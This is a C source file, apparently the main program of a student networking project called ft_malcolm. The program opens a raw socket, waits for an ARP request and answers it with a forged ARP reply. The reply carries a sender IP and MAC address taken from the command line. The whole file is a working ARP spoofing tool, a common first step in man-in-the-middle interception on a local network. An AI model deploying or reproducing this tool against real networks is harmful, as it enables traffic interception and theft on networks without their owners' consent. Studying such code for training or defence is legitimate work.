#include "../include/ft_malcolm.h"

int fdsock = 0;

void    handle_sig_int(int signum)
{
    printf("\n%s\n", EXIT_MSG);
    close(fdsock);
    exit(signum);
}

void    prepare_packet_for_target(int ifindex, struct ethhdr *eth_frame, struct ether_arp *arp, char **av)
{
    struct ifaddrs iface = {0};

    if (interface_from_index(ifindex, &iface) < 0)
        return ;
    printf("\nFound available interface: %s\n", iface.ifa_name);

    ft_memcpy(eth_frame->h_source, ((struct sockaddr_ll *)iface.ifa_addr)->sll_addr, ETH_ALEN);
    string_to_addr(av[4], eth_frame->h_dest, 16, ETH_ALEN, ':');

    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
    string_to_addr(av[1], arp->arp_spa, 10, 4, '.');
    string_to_addr(av[2], arp->arp_sha, 16, ETH_ALEN, ':');
    string_to_addr(av[3], arp->arp_tpa, 10, 4, '.');
    string_to_addr(av[4], arp->arp_tha, 16, ETH_ALEN, ':');
}

int     main(int ac, char **av)
{
    uint8_t packet[IP_MAXPACKET] = {0};
    struct ethhdr *eth_frame = (struct ethhdr *)packet;
    struct ether_arp *arp = (struct ether_arp *)(packet + sizeof(struct ethhdr));
    struct sockaddr_ll src_addr = {0};
    socklen_t src_addr_len = sizeof(src_addr);

    signal(SIGINT, &handle_sig_int);
    if (check(ac, av) < 0)
        return usage(av[0]);

    if ((fdsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
        return printf("%s: Socket error\n", av[0]) && usage(av[0]);
    while ((ntohs(eth_frame->h_proto) != ETH_P_ARP) || (ntohs(arp->ea_hdr.ar_op) != ARPOP_REQUEST)) {
        recvfrom(fdsock, packet, sizeof(packet), 0, (struct sockaddr*)&src_addr, &src_addr_len);
    }
    print_info(eth_frame, arp, "REPLY");
    prepare_packet_for_target(src_addr.sll_ifindex, eth_frame, arp, av);
    print_info(eth_frame, arp, "RESPONSE");

    sendto(fdsock, packet, sizeof(packet), 0, 0, 0);

    printf("\n%s\n", EXIT_MSG);
    close(fdsock);
}